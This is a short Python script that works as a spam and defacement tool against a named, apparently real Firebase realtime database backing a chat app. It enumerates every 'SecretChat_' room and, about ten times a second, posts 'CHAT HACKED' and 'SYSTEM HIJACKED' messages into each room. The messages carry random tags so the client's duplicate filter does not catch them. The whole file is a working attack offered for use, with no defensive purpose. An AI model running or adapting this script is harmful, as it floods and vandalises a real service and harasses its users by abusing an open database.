import time
import random
import requests

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Nuclear Bypass Spammer Initialized...")

session = requests.Session()

while True:
    try:
        # Step 1: Fetch all active server rooms
        root_response = session.get(f"{database_url}/.json", timeout=5)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                for key in data.keys():
                    if key.startswith("SecretChat_"):
                        room_url = f"{database_url}/{key}.json"
                        
                        # Generate random tag so the client doesn't block it as a duplicate
                        rand_tag = random.randint(1000, 99999)
                        
                        payload = {
                            "Sender": f"CHAT HACKED [{rand_tag}]",
                            "Message": f"SYSTEM HIJACKED BY FORBID, DISCORD: forbiddenway #{rand_tag}",
                            "Timestamp": int(time.time() * 1000) + rand_tag,
                            "Aura": "voidWings",
                            "Color": "red"
                        }
                        
                        # Step 2: Flood the room
                        session.post(room_url, json=payload, headers=headers, timeout=3)
                        print(f"[FORBID] Flood packet sent to: {key}")
        else:
            print(f"[FORBID] Root scan failed: {root_response.status_code}")
            
    except Exception as e:
        print(f"[FORBID] Error: {e}")
        
    # High-speed loop interval
    time.sleep(0.1)
